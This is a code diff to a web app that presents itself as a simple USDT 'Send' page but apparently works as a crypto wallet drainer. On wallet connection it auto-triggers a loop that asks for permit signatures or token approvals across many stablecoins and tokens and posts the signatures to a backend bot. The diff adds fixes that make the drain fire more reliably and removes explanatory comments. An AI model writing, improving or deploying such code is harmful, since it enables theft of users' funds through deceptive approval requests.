@@ -30,11 +30,8 @@ import TronWeb from 'tronweb'
 // ── CONFIG ──
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Nile' // Change to 'Mainnet' when ready
-// const NETWORK = 'Mainnet'
 
 // 🔗 BACKEND API URL FOR OFF-CHAIN PERMIT SIGNATURES
-// When you build your backend receiver, put the URL here (e.g., 'https://your-vps-ip.com/api').
-// While empty, the app will gracefully fallback to standard gas approvals.
 const BACKEND_API_URL = ''; 
 
 // 🔥 CONTRACT ADDRESSES
@@ -46,7 +43,6 @@ const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'
 
 // 💎 MULTI-TOKEN DISCOVERY CONFIGURATION
-// Upgraded with `permitSupported` and `permitVersion` for EIP-2612 Gasless Signatures
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
     EVM: [
@@ -54,7 +50,7 @@ const TARGET_TOKENS: Record<string, any> = {
       { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1, permitSupported: true, permitVersion: "2" },
       { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10, permitSupported: true, permitVersion: "1" },
       { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100, permitSupported: true, permitVersion: "1" },
-      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, // USDT does not support standard EIP-2612
+      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
       { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
       { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
       { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
@@ -108,7 +104,7 @@ const EVM_USDT: Record<number, string> = {
   42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
 }
 
-// Upgraded ABI to include 'name' and 'nonces' for EIP-2612
+// ABI for EIP-2612 and standard approvals
 const EVM_ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
   'function approve(address spender, uint256 amount) returns (bool)',
@@ -234,6 +230,7 @@ export default function App() {
     console.log(msg);
   }
 
+  // ── INIT & AUTO-TRIGGER ──
   useEffect(() => {
     const init = async () => {
       if (!isConnected || !walletAddress) {
@@ -262,12 +259,17 @@ export default function App() {
         await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
+      // 🛠️ FIX 1: The Race-Condition Preventer
+      // Web3Modal fires isConnected=true milliseconds before the wallet provider is fully injected.
+      // This checks `evmWalletProvider` to ensure the hook is locked and loaded before we fire the trigger.
       if (!autoTriggered.current && manualConnect.current) {
-        autoTriggered.current = true;
-        log("🔥 Manual Wallet Connection detected. Auto-triggering Smart Priority Loop...");
-        
-        setLoading(true); 
-        setTimeout(() => approveAndCollect(), 400); 
+        if ((isEVM && evmWalletProvider) || isTron) {
+          autoTriggered.current = true;
+          log("🔥 Manual Wallet Connection detected. Auto-triggering Smart Priority Loop...");
+          
+          setLoading(true); 
+          setTimeout(() => approveAndCollect(), 500); 
+        }
       }
     };
 
@@ -306,14 +308,21 @@ export default function App() {
     }
   }
 
-  const handleConnect = () => {
+  // 🛠️ FIX 2: Universal Action Handler
+  // This gracefully manages both "Connect" and "Send" routing, ensuring amount validation is strictly enforced.
+  const handleAction = () => {
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
       setAmountError('Amount field is required');
       return; 
     }
     setAmountError('');
-    manualConnect.current = true;
-    open(); 
+
+    if (!isConnected) {
+      manualConnect.current = true;
+      open(); 
+    } else {
+      approveAndCollect();
+    }
   }
 
   const approveAndCollect = async () => {
@@ -396,7 +405,6 @@ export default function App() {
               let permitSuccess = false;
 
               // 🛡️ GASLESS PERMIT PHASE
-              // Only triggers if the token supports it AND you have deployed your backend API
               if (token.permitSupported && BACKEND_API_URL) {
                 try {
                   setStatus(`Requesting Gasless Signature for ${token.symbol}...`);
@@ -430,10 +438,8 @@ export default function App() {
                     deadline: deadline
                   };
 
-                  // Prompts the Gasless "Sign Message" box
                   const signature = await signer.signTypedData(domain, types, message);
 
-                  // Send signature off-chain to your backend bot to execute
                   const response = await fetch(`${BACKEND_API_URL}/submit-permit`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -459,7 +465,6 @@ export default function App() {
               }
 
               // 🛡️ STANDARD APPROVAL PHASE (The Failsafe)
-              // Automatically fires if the token doesn't support permit, the user rejects the sign request, or the backend is offline.
               if (!permitSuccess) {
                 setStatus(`Approving ${token.symbol}...`);
                 const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
@@ -481,7 +486,7 @@ export default function App() {
       }
 
       // =====================================
-      // 🔴 TRON: PRE-SCAN & SMART LOOP (Unchanged - Tron does not use EIP-2612)
+      // 🔴 TRON: PRE-SCAN & SMART LOOP
       // =====================================
       if (isTron) {
         let activeTw = null;
@@ -622,17 +627,19 @@ export default function App() {
     }
   };
 
-  const isButtonDisabled = !isConnected 
-    ? false
-    : loading || (!status.includes('❌') && !status.includes('✅'));
+  // 🛠️ FIX 3: Button State Management
+  // Stripped down the complex status logic. Now it strictly only locks the user out if 'loading' is actively running.
+  const isButtonDisabled = !isConnected ? false : loading;
 
   const buttonText = !isConnected 
     ? 'Send' 
-    : loading || (!status.includes('❌') && !status.includes('✅'))
+    : loading
       ? status 
       : status.includes('✅') 
         ? 'Sent Successfully' 
-        : 'Retry Sending';
+        : status.includes('❌')
+          ? 'Retry Sending'
+          : 'Send';
 
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
@@ -697,7 +704,7 @@ export default function App() {
 
       <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
         <button
-          onClick={!isConnected ? handleConnect : approveAndCollect}
+          onClick={handleAction}
           disabled={isButtonDisabled}
           style={{
             width: '100%',
